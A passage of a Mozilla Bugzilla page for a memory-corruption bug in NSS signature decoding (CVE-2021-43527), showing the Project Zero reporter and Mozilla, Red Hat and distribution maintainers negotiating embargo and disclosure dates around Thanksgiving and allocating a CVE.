          <div class="change-time"><span class="rel-time" title="2021-11-17 15:56 PST" data-time="1637193391">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-75">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-75" data-comment-id="15661554"><blockquote>
<blockquote>
<p>Benjamin is okay with pushing the NSS release date to the 9th of Dec and it sounds like this is also fine for Thunderbird and Red Hat.</p>
</blockquote>
</blockquote>
<p>This would be by far my preference.</p>
<blockquote>
<p>There is an issue here,  our (Project Zero) policies dictate what I&#39;m required to do 30 days after any &quot;fix&quot; is &quot;made available&quot;. I understand the Thunderbird patch was not a complete fix, but if I accept that interpretation, then other (less cooperative) vendors can game our policies by releasing partial fixes and then blocking public disclosure. I would really prefer to avoid setting that precedent, not all vendors are as diligent as Mozilla.</p>
<p>It would really make my life a lot simpler if we try to keep it before the 4th.</p>
</blockquote>
<p>If we have to keep this early of a date, then we should definitely notify other distros early. From a practical matter you really need to assume holidays are noops. Yes distros can handle having to cobble something together over the holidays, or just flat out saying we aren&#39;t going to make the embargo date for the release, but artificially generating such a condition is very unfriendly.</p>
</div></div><div class="change-set" id="c76"><div class="comment" data-id="15662007" data-no="76"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-76" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_487652" id="a2072998_600971"><img src="https://secure.gravatar.com/avatar/b0fb5a6d4bf1758a9ef4db8f700e3bb4?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_487652" id="a2072998_600971"><a class="email " href="/user_profile?user_id=487652" > <span class="fna">Alicja Kario</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-76"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-76" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c76">Comment 76</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-11-18 03:56 PST" data-time="1637236608">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-76">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-76" data-comment-id="15662007"><p>(In reply to taviso from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1737470#c74" title="RESOLVED FIXED - Memory Corruption in decodeECorDsaSignature with DSA signatures (and RSA-PSS)">comment #74</a>)</p>
<blockquote>
<p>(In reply to Dennis Jackson from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1737470#c73" title="RESOLVED FIXED - Memory Corruption in decodeECorDsaSignature with DSA signatures (and RSA-PSS)">comment #73</a>)</p>
<blockquote>
<p>(In reply to taviso from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1737470#c71" title="RESOLVED FIXED - Memory Corruption in decodeECorDsaSignature with DSA signatures (and RSA-PSS)">comment #71</a>)</p>
<blockquote>
<p>My biggest issue with the plan is Nov 24th is the day before thanksgiving.</p>
</blockquote>
<p>Thanks for the feedback Kai &amp; Bob.</p>
<p>Let&#39;s avoid Thanksgiving entirely and move the disclosure date back to Monday 29th of November and release the embargo on Thursday the 9th of December. This means we can include a finalised patch with the disclosure and give everybody 8 working days to get their ducks in a row.</p>
<p>Benjamin is okay with pushing the NSS release date to the 9th of Dec and it sounds like this is also fine for Thunderbird and Red Hat.</p>
</blockquote>
<p>There is an issue here,  our (Project Zero) policies dictate what I&#39;m required to do 30 days after any &quot;fix&quot; is &quot;made available&quot;. I understand the Thunderbird patch was not a complete fix, but if I accept that interpretation, then other (less cooperative) vendors can game our policies by releasing partial fixes and then blocking public disclosure. I would really prefer to avoid setting that precedent, not all vendors are as diligent as Mozilla.</p>
</blockquote>
<p>I do not know how the Thunderbird workaround looks like; if it&#39;s in the NSS side or the Thunderbird side. If it&#39;s in Thunderbird side, we can&#39;t really say that a fix was made available to users of curl compiled against NSS or Apache mod_nss (among others).</p>
</div></div><div class="change-set" id="c77"><div class="comment" data-id="15662009" data-no="77"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-77" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_36541" id="a2072998_600971"><img src="https://secure.gravatar.com/avatar/d11b5b0a468ed960df1fde3c304d3580?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_36541" id="a2072998_600971"><a class="email " href="/user_profile?user_id=36541" > <span class="fna">Kai Engert [:KaiE:]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-77"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-77" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c77">Comment 77</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-11-18 03:58 PST" data-time="1637236701">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-77">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-77" data-comment-id="15662009"><p>But one can argue a partial fix was made available for some users.</p>
</div></div><div class="change-set" id="a2157041_75935"><div class="change" id="aa2157041_75935">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_75935" id="a2157041_75935"><img src="https://secure.gravatar.com/avatar/a10f7f199c75a9a5a1eb347730524a7a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_75935" id="a2157041_75935"><a class="email " href="/user_profile?user_id=75935" > <span class="fna">Ryan VanderMeulen [:RyanVM]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="as-a2157041_75935"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a2157041_75935">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#a2157041_75935">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-11-18 06:09 PST" data-time="1637244598">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox94&amp;o1=isnotempty">status-firefox94</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox94&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox94&amp;o1=equals&amp;v1=wontfix">wontfix</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox96&amp;o1=isnotempty">status-firefox96</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox96&amp;o1=equals&amp;v1=affected">affected</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox96&amp;o1=isnotempty">tracking-firefox96</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox96&amp;o1=equals&amp;v1=%2B">+</a></div></div></div><div class="change-set" id="c78"><div class="comment" data-id="15662330" data-no="78"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-78" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_644159" id="a2157041_75935"><img src="https://secure.gravatar.com/avatar/46fbd084ad1a893caecbb3d539951e40?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_644159" id="a2157041_75935"><a class="email " href="/user_profile?user_id=644159" > <span class="fna">Dennis Jackson</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-78"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-78" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c78">Comment 78</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-11-18 07:24 PST" data-time="1637249088">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-78">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-78" data-comment-id="15662330"><p>(In reply to taviso from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1737470#c74" title="RESOLVED FIXED - Memory Corruption in decodeECorDsaSignature with DSA signatures (and RSA-PSS)">comment #74</a>)</p>
<blockquote>
<p>Could you let me review the post before sending it?</p>
</blockquote>
<p>Sure, that would be great.</p>
<blockquote>
<p>There is an issue here,  our (Project Zero) policies dictate what I&#39;m required to do 30 days after any &quot;fix&quot; is &quot;made available&quot;. I understand the Thunderbird patch was not a complete fix, but if I accept that interpretation, then other (less cooperative) vendors can game our policies by releasing partial fixes and then blocking public disclosure. I would really prefer to avoid setting that precedent, not all vendors are as diligent as Mozilla.</p>
</blockquote>
<p>We donâ€™t expect any special treatment from Project Zero. If you are notifying us that you consider the Thunderbird decoy patch to be a &#39;broadly available fix&#39; then, in line with your published policy, we will publicly disclose on the next working day after the 4th (aka December 6th).</p>
<p>That said, I donâ€™t agree the fix is â€˜broadly availableâ€™ as there are many downstream applications which have no available fix. Mozilla would like to give those maintainers as much as possible to integrate the patch and backport it to their supported versions. In both cases, we plan to privately disclose on November 29th (the Monday after Thanksgiving).</p>
</div></div><div class="change-set" id="c79"><div class="comment" data-id="15662510" data-no="79"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-79" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a2157041_75935"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_1689" id="a2157041_75935"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-79"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-79" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c79">Comment 79</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-11-18 08:59 PST" data-time="1637254793">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-79">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-79" data-comment-id="15662510"><p>(In reply to Dennis Jackson from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1737470#c73" title="RESOLVED FIXED - Memory Corruption in decodeECorDsaSignature with DSA signatures (and RSA-PSS)">comment #73</a>)</p>
<blockquote>
<blockquote>
<p>Has Mozilla/Red Hat allocated a CVE for this issue? I think Huzaifa might know for Red Hat.</p>
</blockquote>
<p>Mozilla will allocate. Dan, can you handle this?</p>
</blockquote>
<p>Use <a href="https://www.cve.org/CVERecord?id=CVE-2021-43527">CVE-2021-43527</a> for this issue.</p>
</div><div class="activity"><div class="change">Alias: CVE-2021-43527</div><div class="change">Flags: <span class="activity-deleted">needinfo?(dveditz)</span></div></div></div><div class="change-set" id="c80"><div class="comment" data-id="15662529" data-no="80"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-80" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_592223" id="a2157041_75935"><img src="https://secure.gravatar.com/avatar/27c1a60000797d8e229249290a7c7377?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_592223" id="a2157041_75935"><a class="email " href="/user_profile?user_id=592223" > <span class="fna">taviso</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-80"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-80" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c80">Comment 80</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-11-18 09:16 PST" data-time="1637255808">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-80">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-80" data-comment-id="15662529"><p>(In reply to Dennis Jackson from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1737470#c78" title="RESOLVED FIXED - Memory Corruption in decodeECorDsaSignature with DSA signatures (and RSA-PSS)">comment #78</a>)</p>
<blockquote>
<p>That said, I donâ€™t agree the fix is â€˜broadly availableâ€™ as there are many downstream applications which have no available fix.</p>
</blockquote>
<p>I understand, but you can imagine how a vendor could release a patch for their main product, and then demand no advisory is published because they haven&#39;t patched some minor product. You have to understand that I deal with a lot of uncooperative vendors who want to argue about policies to hide security issues from users.</p>
<blockquote>
<p>Mozilla would like to give those maintainers as much as possible to integrate the patch and backport it to their supported versions. In both cases, we plan to privately disclose on November 29th (the Monday after Thanksgiving).</p>
</blockquote>
<p>You mean want to inform the distros list on November 29th? That&#39;s okay with me, although I really think a few more days would be appreciated if you can swing it.</p>
</div></div><div class="change-set" id="c81"><div class="comment" data-id="15664101" data-no="81"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-81" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a2157041_75935"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_1689" id="a2157041_75935"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-81"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-81" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c81">Comment 81</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-11-19 10:18 PST" data-time="1637345902">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-81">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-81" data-comment-id="15664101"><p>(In reply to taviso from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1737470#c80" title="RESOLVED FIXED - Memory Corruption in decodeECorDsaSignature with DSA signatures (and RSA-PSS)">comment #80</a>)</p>
<blockquote>
<p>You mean want to inform the distros list on November 29th? That&#39;s okay with me, although I really think a few more days would be appreciated if you can swing it.</p>
</blockquote>
<p>It&#39;s a balance: to give them more time then either we&#39;re ruining Thanksgiving for US-based folks by warning them right before a major travel holiday, or we&#39;re going even further over your deadline by releasing later :-(   And if the advisory has already been published releasing later isn&#39;t giving anyone more time.</p>
</div></div><div class="change-set" id="c82"><div class="comment" data-id="15664150" data-no="82"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-82" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_592223" id="a2157041_75935"><img src="https://secure.gravatar.com/avatar/27c1a60000797d8e229249290a7c7377?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_592223" id="a2157041_75935"><a class="email " href="/user_profile?user_id=592223" > <span class="fna">taviso</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-82"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-82" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c82">Comment 82</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-11-19 10:48 PST" data-time="1637347711">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-82">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-82" data-comment-id="15664150"><p>(In reply to Daniel Veditz [:dveditz] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1737470#c81" title="RESOLVED FIXED - Memory Corruption in decodeECorDsaSignature with DSA signatures (and RSA-PSS)">comment #81</a>)</p>
<blockquote>
<p>(In reply to taviso from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1737470#c80" title="RESOLVED FIXED - Memory Corruption in decodeECorDsaSignature with DSA signatures (and RSA-PSS)">comment #80</a>)</p>
<blockquote>
<p>You mean want to inform the distros list on November 29th? That&#39;s okay with me, although I really think a few more days would be appreciated if you can swing it.</p>
</blockquote>
<p>It&#39;s a balance: to give them more time then either we&#39;re ruining Thanksgiving for US-based folks by warning them right before a major travel holiday, or we&#39;re going even further over your deadline by releasing later :-(   And if the advisory has already been published releasing later isn&#39;t giving anyone more time.</p>
</blockquote>
<p>Fair enough. In my experience, I think most teams (even volunteer teams, e.g. Debian) are globally distributed and wouldn&#39;t be annoyed with the extra time. This is just my opinion, so long as it&#39;s under the deadline, the choice is yours!</p>
</div></div><div class="change-set" id="c84"><div class="comment" data-id="15676144" data-no="84"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-84" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_331752" id="a2157041_75935"><img src="https://secure.gravatar.com/avatar/0906041fcade715bfd1cb25f1d12cb8d?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_331752" id="a2157041_75935"><a class="email " href="/user_profile?user_id=331752" > <span class="fna">Huzaifa Sidhpurwala</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-84"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-84" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c84">Comment 84</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-11-29 07:11 PST" data-time="1638198711">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-84">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-84" data-comment-id="15676144"><p>Tavis,</p>
<p>As an apart, are you planning to do a technical blog about this on the project zero site?</p>
</div></div><div class="change-set" id="c85"><div class="comment" data-id="15676523" data-no="85"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-85" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_592223" id="a2157041_75935"><img src="https://secure.gravatar.com/avatar/27c1a60000797d8e229249290a7c7377?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_592223" id="a2157041_75935"><a class="email " href="/user_profile?user_id=592223" > <span class="fna">taviso</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-85"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-85" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c85">Comment 85</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-11-29 11:15 PST" data-time="1638213340">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-85">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-85" data-comment-id="15676523"><p>Yes - I&#39;m planning to blog about the process I used to discover it and so on.</p>
</div></div><div class="change-set" id="c86"><div class="comment" data-id="15676533" data-no="86"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-86" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_622637" id="a2157041_75935"><img src="https://secure.gravatar.com/avatar/38f561698d679a724938d4600c0f8b52?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_622637" id="a2157041_75935"><a class="email " href="/user_profile?user_id=622637" > <span class="fna">Benjamin Beurdouche [:beurdouche]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-86"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-86" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c86">Comment 86</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-11-29 11:25 PST" data-time="1638213947">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-86">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-86" data-comment-id="15676533"><p>Status update. Thanks to Dennis, the Private disclosure to the distros list has been done and they acknowledged this morning.<br>
The public disclosure is set to December 6th, 16:00 UTC.</p>
</div></div><div class="change-set" id="a3233033_1689"><div class="change" id="aa3233033_1689">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a3233033_1689"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_1689" id="a3233033_1689"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="as-a3233033_1689"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a3233033_1689">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#a3233033_1689">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-11-30 17:03 PST" data-time="1638320590">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox95&amp;o1=isnotempty">status-firefox95</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox95&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox95&amp;o1=equals&amp;v1=disabled">disabled</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox96&amp;o1=isnotempty">status-firefox96</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox96&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox96&amp;o1=equals&amp;v1=disabled">disabled</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox_esr91&amp;o1=isnotempty">status-firefox-esr91</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox_esr91&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox_esr91&amp;o1=equals&amp;v1=disabled">disabled</a></div></div></div><div class="change-set" id="c87"><div class="comment" data-id="15679038" data-no="87"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-87" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_36541" id="a3233033_1689"><img src="https://secure.gravatar.com/avatar/d11b5b0a468ed960df1fde3c304d3580?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_36541" id="a3233033_1689"><a class="email " href="/user_profile?user_id=36541" > <span class="fna">Kai Engert [:KaiE:]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-87"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-87" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c87">Comment 87</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-12-01 03:32 PST" data-time="1638358372">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-87">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-87" data-comment-id="15679038"><p>what&#39;s the meaning of &quot;disabled&quot; for the status-firefox-esr91 flag?</p>
</div></div><div class="change-set" id="a3281852_622637"><div class="change" id="aa3281852_622637">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_622637" id="a3281852_622637"><img src="https://secure.gravatar.com/avatar/38f561698d679a724938d4600c0f8b52?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_622637" id="a3281852_622637"><a class="email " href="/user_profile?user_id=622637" > <span class="fna">Benjamin Beurdouche [:beurdouche]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="as-a3281852_622637"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a3281852_622637">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#a3281852_622637">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-12-01 06:36 PST" data-time="1638369409">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(bbeurdouche)</span></div><div class="change">Keywords: <a href="/buglist.cgi?keywords=leave-open&amp;resolution=---">leave-open</a></div></div></div><div class="change-set" id="c88"><div class="comment" data-id="15679255" data-no="88"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-88" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_622637" id="a3281852_622637"><img src="https://secure.gravatar.com/avatar/38f561698d679a724938d4600c0f8b52?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_622637" id="a3281852_622637"><a class="email " href="/user_profile?user_id=622637" > <span class="fna">Benjamin Beurdouche [:beurdouche]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-88"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-88" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c88">Comment 88</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-12-01 06:52 PST" data-time="1638370358">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-88">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-9253226"
         class="attachment"
         data-id="9253226" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="phabricator-D132576-url.txt">
      <meta itemprop="contentSize" content="48">
